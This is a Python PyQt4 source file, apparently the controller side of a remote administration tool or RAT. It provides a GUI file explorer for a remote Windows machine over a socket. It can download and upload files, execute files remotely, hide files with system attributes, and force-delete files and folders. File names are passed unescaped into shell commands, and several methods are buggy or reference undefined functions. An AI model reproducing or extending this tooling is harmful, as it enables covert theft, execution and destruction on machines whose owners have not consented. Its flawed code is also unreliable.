from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import subprocess
import ctypes
import time
import socket
import os
from libs.modechat import get, send


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.assets = args['assets']

        self.gui = QApplication.processEvents

        # hide progressbar
        self.progressBar.setVisible(False)
        self.cancelButton.setVisible(False)

        # progress status
        self.activeProgress = False

        # init icons
        self.fileIcon = os.path.join(self.assets, 'file.png')
        self.folderIcon = os.path.join(self.assets, 'folder.png')

        self.setWindowTitle('Remote File Explorer on - %s - Socket #%s' % (self.ipAddress, self.socket))

        # signals
        self.upButton.clicked.connect(self.parent_folder)
        self.explorerTable.doubleClicked.connect(self.open_folder)
        self.explorerPathEntry.returnPressed.connect(self.open_path)
        self.uploadButton.clicked.connect(self.upload)
        self.downloadButton.clicked.connect(self.download)
        self.cancelButton.clicked.connect(self.cancelProgress)

        # Initializing combobox change Event
        self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.drive_change)

        self.explorerTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.explorerTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.right_click_menu)

        self.get_content()

    def right_click_menu(self, point):
        #try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            self.emenu = QMenu(self)

            # File commands
            if '<FILE>' in _type:
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'download.png')), 'Download', self.download)
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'execute.png')), 'Execute', self.execute_remotely)

            # Folder commands
            elif '<DIR>' in _type:
                self.emenu.addAction(QIcon(os.path.join(self.assets, 'open.png')), 'Open Folder', self.open_folder)

            # Global commands
            self.hidden_menu = QMenu(self.emenu)
            self.hidden_menu.setTitle('Hidden attribute')
            self.hidden_menu.setIcon(QIcon(os.path.join(self.assets, 'hidden.png')))
            self.emenu.addMenu(self.hidden_menu)
            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'hidden.png')), 'Hide', self.hide)
            self.hidden_menu.addAction(QIcon(os.path.join(self.assets, 'unhide.png')), 'Unhide', self.unhide)
            self.emenu.addSeparator()
            self.emenu.addAction(QIcon(os.path.join(self.assets, 'remove.png')), 'Remove', self.remove)

            self.emenu.exec_(self.explorerTable.mapToGlobal(point))

        #except AttributeError:
            #pass

    def unhide(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        get(self.sock, 'attrib -h -s {}'.format(_file), 'hide')
        self.get_content()

    def hide(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        get(self.sock, 'attrib +h +s {}'.format(_file), 'unhide')
        self.get_content()

    def execute_remotely(self):
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        data = get(self.sock, 'start /d %CD% {}'.format(_file), 'execute')

    def remove(self):
        try:
            _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
            _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())

            warn = QMessageBox(QMessageBox.Question, 'Confirm', 'Are you sure to delete?')
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                if '<FILE>' in _type:
                    result = get(self.sock, 'del /Q %s' % _file, 'remove')
                elif '<DIR>' in _type:
                    result = get(self.sock, 'rmdir /S /Q %s' % _file, 'remove')
                self.getRemoteContent()
            else:
                return
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
            warn.exec_()

    def tempBlockSignals(self, bool):
        if bool:
            self.explorerDrivesDrop.blockSignals(True)
            self.explorerPathEntry.blockSignals(True)
            self.explorerTable.blockSignals(True)
            self.uploadButton.blockSignals(True)
            self.downloadButton.blockSignals(True)
            self.upButton.blockSignals(True)
            self.refreshButton.blockSignals(True)
        elif not bool:
            self.explorerDrivesDrop.blockSignals(False)
            self.explorerPathEntry.blockSignals(False)
            self.explorerTable.blockSignals(False)
            self.uploadButton.blockSignals(False)
            self.downloadButton.blockSignals(False)
            self.upButton.blockSignals(False)
            self.refreshButton.blockSignals(False)

    def cancelProgress(self):
        self.activeProgress = False

    def download(self):
        # Get file name
        _type = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text())
        _file = str(self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text())
        print _type
        print _file

        if '<FILE>' in _type:

            # Preparing for upload
            self.progressBar.setVisible(True)
            self.cancelButton.setVisible(True)
            self.tempBlockSignals(True)

            self.activeProgress = True

            end = '[ENDOFMESSAGE]'
            data = ''

            send(self.sock, 'download ' + _file)
            try:
                recv = str(self.sock.recv(1024))
                if recv.isdigit():
                    fileSize = int(recv)
                    self.sock.sendall('ok')

                    l = self.sock.recv(1024)
                    while l:
                        self.gui()
                        data += l
                        self.progressBar.setValue(len(data) * 100 / fileSize)
                        if data.endswith(end):
                            break
                        if not self.activeProgress:
                            raise socket.error
                        else:
                            l = self.sock.recv(1024)
                    with open(_file, 'wb') as _f:
                        _f.write(data)
            except socket.error:
                print 'socket error'
            finally:
                self.progressBar.setVisible(False)
                self.cancelButton.setVisible(False)
                self.tempBlockSignals(False)
                # except AttributeError:
                # warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
                # warn.exec_()

    def upload(self):
        try:
            # Get file name
            file_name = str(QFileDialog.getOpenFileName(self, 'Choose File', ''))
            if file_name:

                # Preparing for upload
                self.progressBar.setVisible(True)
                self.cancelButton.setVisible(True)
                self.tempBlockSignals(True)

                self.activeProgress = True

                end = '[ENDOFMESSAGE]'
                fileSize = os.path.getsize(file_name)
                uploadedSize = 0

                send(self.sock, 'upload ' + file_name)

                try:
                    with open(file_name, 'rb') as _f:
                        while 1:
                            self.gui()
                            if not self.activeProgress:
                                break
                            data = _f.readline()
                            uploadedSize += len(data)
                            if data:
                                self.sock.send(data)
                                self.progressBar.setValue(uploadedSize * 100 / fileSize)
                                del data
                            else:
                                self.sock.send(end)
                                break
                except IOError:
                    print 'Permision denied'
                if self.activeProgress:
                    result = self.sock.recv(1024)
                    if 'downloadDone' in result:
                        self.getRemoteContent()
                    elif 'downloadError' in result:
                        return False
                self.progressBar.setVisible(False)
                self.cancelButton.setVisible(False)
                self.tempBlockSignals(False)
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No File Selected', QMessageBox.Ok)
            warn.exec_()

    def get_content(self):

        def sizeof_fmt(num, suffix='B'):
            for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
                if abs(num) < 1024.0:
                    return "%3.1f%s%s" % (num, unit, suffix)
                num /= 1024.0
            return "%.1f%s%s" % (num, 'Yi', suffix)

        # Turn combo signal on
        self.comboInEditMode = True
        self.explorerDrivesDrop.clear()
        self.data = get(self.sock, 'wmic logicaldisk get caption', 'mexplorer')
        # Set captions in combobox
        for i in self.data.split('Caption')[-1].split('\n'):
            if ':' in i:
                self.explorerDrivesDrop.addItem(i.replace(' ', '').replace('\r', ''))

        # Initializing table
        self.explorerTable.clearContents()
        self.explorerTable.sortItems(0)

        try:
            data = get(self.sock, 'ls', 'explorerContent')

            # set remote path entry
            content = ast.literal_eval(data)

            self.explorerPathEntry.setText(content['path'])

            # Get active drive caption
            self.explorerDrivesDrop.setCurrentIndex(
                self.explorerDrivesDrop.findText(content['path'].split('\\')[0], Qt.MatchFixedString))

            # Turn combo signal off
            self.comboInEditMode = False

            # set tables row count
            self.explorerTable.setRowCount(len(content) - 1)

            # add content to table
            for n, i in enumerate(content):

                if i == 'path':
                    continue

                if content[int(i)]['hidden']:
                    file_color = QColor(235, 235, 235)
                    folder_color = QColor(201, 101, 101)
                else:
                    file_color = QColor('#9b59b6')
                    folder_color = QColor(0, 255, 255)

                # set content type
                item = QTableWidgetItem('<FILE>') if content[i]['type'] else QTableWidgetItem('<DIR>')
                if content[i]['type']:
                    item.setTextColor(file_color)
                    item.setSizeHint(QSize(50, 30))
                else:
                    item.setTextColor(folder_color)
                    item.setSizeHint(QSize(50, 30))
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.explorerTable.setItem(n, 0, item)

                # set content name
                item = QTableWidgetItem(content[i]['name'])
                if content[i]['type']:
                    item.setTextColor(file_color)
                    item.setIcon(QIcon(QPixmap(self.fileIcon)))
                else:
                    item.setTextColor(folder_color)
                    item.setIcon(QIcon(QPixmap(self.folderIcon)))
                self.explorerTable.setItem(n, 1, item)

                # set content modified date
                item = QTableWidgetItem(content[i]['modified'])
                item.setTextAlignment(Qt.AlignCenter)
                item.setSizeHint(QSize(220, 30))
                self.explorerTable.setItem(n, 2, item)

                # set file size
                item = QTableWidgetItem(sizeof_fmt(content[i]['size'])) if content[i]['type'] else QTableWidgetItem('')
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(file_color)
                self.explorerTable.setItem(n, 3, item)

            # update table
            self.explorerTable.horizontalHeaderItem(3).setTextAlignment(Qt.AlignCenter)
            self.explorerTable.resizeColumnsToContents()

        except (SyntaxError, ValueError):
            pass

    # open parent folder
    def parent_folder(self):
        get(self.sock, 'cd ..', 'parentFolder')
        self.get_content()

    # Change Drive
    def drive_change(self):
        if not self.comboInEditMode:
            data = get(self.sock, 'cd ' + str(self.explorerDrivesDrop.itemText(self.explorerDrivesDrop.currentIndex())),
                       'drivechange')
            if 'Error opening directory' in data:
                warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Directory', QMessageBox.Ok)
                warn.exec_()

            self.get_content()

    # open remote folder
    def open_folder(self):

        # Get folder name
        _type = self.explorerTable.item(self.explorerTable.currentItem().row(), 0).text()
        _name = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()

        if '<DIR>' in _type:
            # Choose new folder
            get(self.sock, 'cd %s' % _name, 'choosefolder')

            # Update table
            self.get_content()

    # open remote folder from path entry
    def open_path(self):
        recv = get(self.sock, 'cd %s' % str(self.explorerPathEntry.text()), 'changepath')
        if 'Error opening directory' in recv:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'Error Opening Path', QMessageBox.Ok)
            warn.exec_()

        self.get_content()
